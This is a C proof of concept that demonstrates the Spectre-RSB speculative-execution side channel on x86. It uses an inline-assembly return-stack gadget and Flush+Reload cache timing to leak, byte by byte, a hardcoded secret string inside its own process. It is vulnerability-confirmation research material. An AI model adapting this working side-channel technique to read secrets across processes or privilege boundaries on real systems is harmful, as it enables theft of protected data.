/*************************
 * Description: A PoC to confirm Spectre-RSB on x86
 *
 * Author: guowenquan@iie.ac.cn
 * *************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h> 
#include "../tools/tools.h"
#include <sys/mman.h>

#define STRIDE 4096

volatile unsigned char array[256 * STRIDE];


const char *secret = "Spectre V5 PoC Success!";
int finished_one = 0;
int flag= 0;

// Gadget 函数：尝试劫持返回地址  将返回地址修改成safe_return
__attribute__((naked)) void gadget(void)
{
    asm volatile(
        "push %rbp      \n"
        "movq %rsp, %rbp \n"
        "pop %rdi       \n"
        "pop %rdi       \n"
        "pop %rdi       \n"
        "pop %rdi       \n"
        "pop %rbp       \n"
        "clflush (%rsp) \n"
        "lfence         \n"
        "retq            \n");
}

// 推测访问函数：进行推测性读取
__attribute__((noinline)) void speculative(volatile unsigned char *secret_ptr)
{
    gadget();
    // temp &= array['A' * 4096]; //这样写需要大一些的推测执行窗口，改用汇编
    asm volatile(
        "movzbl (%rdi), %edx \n"  // load secret byte
        "shl $12, %rdx\n"         // secret * 4096
        "movb array(%rdx), %al\n" // load array[secret * 4096] into cache
    );
    printf("[*] Return from BadPath\n");
}

volatile void safe_return(void)
{
    if (!flag){
        printf("[*] Return from SafePath\n");
        flag++;
    }    
}

int recover_secret_byte(unsigned char *secret, uint64_t threshold)
{
    int results[256] = {0};

    for (int tries = 999; tries > 0; tries--)
    {
        // 先清侧信道
        for (int i = 0; i < 256; i++)
            flush_addr((void*)&array[i * STRIDE]);
        MFENCE;

        speculative(secret);
        safe_return();

        // 256 桶 = 128 页 × 2 偏移
        for (int off = 0; off < 2; off++)
        { // 0 或 2048
            // 128 页的顺序最好做一次 Fisher–Yates 打乱
            for (int page = 0; page < 128; page++)
            {
                int i = page * 2 + off; // 第 page 页的第 off 桶
                if (time_access((void*)&array[i * STRIDE]) < threshold)
                    results[i]++;
            }
        }
    }

    // 统计时**跳过训练那一行**
    int max = -1, best = -1;
    for (int i = 0; i < 256; i++)
    {
        if (i < 16)
            continue;
        if (results[i] > max)
        {
            max = results[i];
            best = i;
        }
    }

    if (results[best] > 0)
        finished_one = 1;
    else
        finished_one = 0;

    return best;
}

int main()
{

    

    uint64_t threshold = measure_access_time();
    if (threshold == 0)
    {
        fprintf(stderr, "Failed to calibrate threshold. Aborting.\n");
        restore_cpu();
        return 1;
    }
    memset((void*)array, 1, 256 * STRIDE);
    size_t secret_len = strlen(secret);
    char recovered_string[secret_len + 1];
    memset(recovered_string, 0, sizeof(recovered_string));

    printf("[*] Leaking secret: \"%s\"\n", secret);
    printf("[*] Starting attack...\n\n");
    fflush(stdout);

    for (int i = 0; i < secret_len; i++)
    {
        int recovered_byte = recover_secret_byte((unsigned char *)secret++, threshold);
        if (!finished_one)
        {
            i--;
            (unsigned char *)secret--;
            continue;
        }
        recovered_string[i] = (recovered_byte > 31 && recovered_byte < 127) ? (char)recovered_byte : '?';
        printf("\rLeaked: %s", recovered_string);
        fflush(stdout);
    }
    printf("\n\n[*] Attack finished.\n\n");
    return 0;
}
